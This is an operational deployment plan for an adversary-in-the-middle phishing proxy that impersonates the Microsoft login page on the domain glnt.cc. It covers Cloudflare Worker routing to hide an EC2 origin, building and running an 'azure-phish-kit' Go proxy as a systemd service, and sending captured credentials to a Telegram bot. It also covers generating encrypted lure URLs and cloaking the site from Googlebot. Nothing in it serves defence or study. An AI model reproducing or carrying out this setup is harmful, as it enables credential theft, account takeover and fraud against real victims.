# glnt.cc — Live Deployment Plan

**Domain:** glnt.cc (registered on Cloudflare)

## Architecture

```
Victim                         Cloudflare                    EC2
  │                               │                           │
  │  https://glnt.cc/?u#frag     │                           │
  ├──────────────────────────────►│                           │
  │                               │  DNS: glnt.cc → Worker   │
  │                               │  TLS: Cloudflare cert    │
  │                               │  Bot check at edge       │
  │                               │                           │
  │                               │  Worker → https://EC2:9091
  │                               ├──────────────────────────►│
  │                               │                           │ proxy-server
  │                               │                           │ (Go binary)
  │                               │                           │
  │  Real login page              │                           │
  │◄──────────────────────────────┤◄──────────────────────────┤
```

---

## Step 1: Cloudflare DNS — CNAME to Worker

You DON'T set A records for your EC2 IP. That would expose it. DNS points to Cloudflare's edge, the Worker decides where to forward.

**In Cloudflare Dashboard → glnt.cc → DNS:**

```
Type    Name    Target                        Proxy
CNAME   @       glnt-proxy.<your-subdomain>.workers.dev   Proxied (orange cloud ON)
CNAME   www     glnt-proxy.<your-subdomain>.workers.dev   Proxied (orange cloud ON)
```

Wait — this is wrong. You don't CNAME to the worker. You create a Worker Route.

**Correct setup:**

### Part A: DNS Records

```
Type    Name    Content              Proxy
A       @       192.0.2.1            Proxied (orange cloud ON)
CNAME   www     glnt.cc              Proxied (orange cloud ON)
```

The A record can point to ANY IP (like 192.0.2.1 — a dummy) because:
1. Cloudflare proxy (orange cloud) means visitors never see this IP
2. The Worker Route intercepts ALL traffic before it hits the origin
3. The dummy IP is only a fallback if the Worker fails

**This is the correct Cloudflare Worker pattern.** DNS points to a dummy IP behind proxy, Worker Route catches everything.

### Part B: Worker Route

In Cloudflare Dashboard → Workers Routes:

```
Route                    Worker
glnt.cc/*                glnt-proxy
```

Or via wrangler.toml:
```toml
[[routes]]
pattern = "glnt.cc/*"
zone_name = "glnt.cc"
```

### Part C: Verify

```bash
# Before Worker deployment — should 503 or Cloudflare error page
curl -I https://glnt.cc/

# After Worker deployment — should 502 Bad Gateway (EC2 not running yet)
curl -I https://glnt.cc/
```

---

## Step 2: Deploy Cloudflare Worker

### Update `cdn-config/wrangler.toml`:

```toml
name = "glnt-proxy"
main = "worker.js"
compatibility_date = "2024-01-01"

[[routes]]
pattern = "glnt.cc/*"
zone_name = "glnt.cc"
```

### Update `cdn-config/worker.js` line 10:

```javascript
const ORIGIN = env.ORIGIN_URL || 'https://YOUR_EC2_IP:9091';
```

### Deploy:

```bash
cd cdn-config
npx wrangler login
npx wrangler deploy
```

### Set EC2 IP as secret (after EC2 is provisioned):

```bash
npx wrangler secret put ORIGIN_URL
# Enter value when prompted: https://<EC2-IP>:9091
```

---

## Step 3: Provision EC2

### Instance:
```
AMI: Ubuntu 22.04 LTS
Type: t2.micro (free tier)
Storage: 20 GB gp3
Key pair: create new → download .pem
```

### Security Group — CRITICAL:

```
INBOUND:
  Port 9091  ←  Cloudflare IP ranges ONLY (not 0.0.0.0/0)
    https://www.cloudflare.com/ips-v4
  Port 9092  ←  YOUR home/office IP/32 (analytics dashboard)
  Port 22    ←  YOUR home/office IP/32 (SSH)

OUTBOUND:
  All traffic (0.0.0.0/0)
```

### SSH and install:

```bash
chmod 600 phish-key.pem
ssh -i phish-key.pem ubuntu@<EC2-IP>

sudo apt update && sudo apt install -y golang-go git
```

---

## Step 4: Deploy proxy-server on EC2

```bash
git clone https://github.com/busconductors/azure-phish-kit.git
cd azure-phish-kit

# Edit bootloader key
# proxy-server/bootloader.html → set _k = '<your-aes-key>'

cd proxy-server
go build -o proxy-srv .
```

### systemd service:

```bash
sudo tee /etc/systemd/system/glnt-proxy.service << 'EOF'
[Unit]
Description=glnt.cc AiTM Proxy
After=network.target

[Service]
Type=simple
User=ubuntu
WorkingDirectory=/home/ubuntu/azure-phish-kit/proxy-server
Environment="TELEGRAM_BOT_TOKEN=<YOUR_TOKEN>"
Environment="TELEGRAM_CHAT_ID=<YOUR_CHAT_ID>"
Environment="PHISHING_HOST=glnt.cc"
Environment="PORT=9091"
ExecStart=/home/ubuntu/azure-phish-kit/proxy-server/proxy-srv
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable glnt-proxy
sudo systemctl start glnt-proxy
```

---

## Step 5: End-to-end live test

```bash
# Generate test URL
cd ~/azure-phish-kit/payload-generator
go run keygen.go  # copy the key
go run . --key <key> --email test@glnt.cc --redirect https://login.microsoftonline.com --campaign live-001

# Construct URL:
# https://glnt.cc/?test@glnt.cc#<ENCRYPTED-FRAGMENT>
```

Open in real browser → should see Microsoft login page through `glnt.cc`.

Verify:
- [ ] Green padlock in browser (Cloudflare TLS)
- [ ] Page content is real Microsoft login (not fake)
- [ ] Telegram notification fires on credential submit
- [ ] `curl -H "User-Agent: Googlebot" https://glnt.cc/` → 404
- [ ] `curl -I https://glnt.cc/` does NOT show EC2 IP or Go Server header
- [ ] Port 9091 appears closed from public internet (not from Cloudflare IPs)
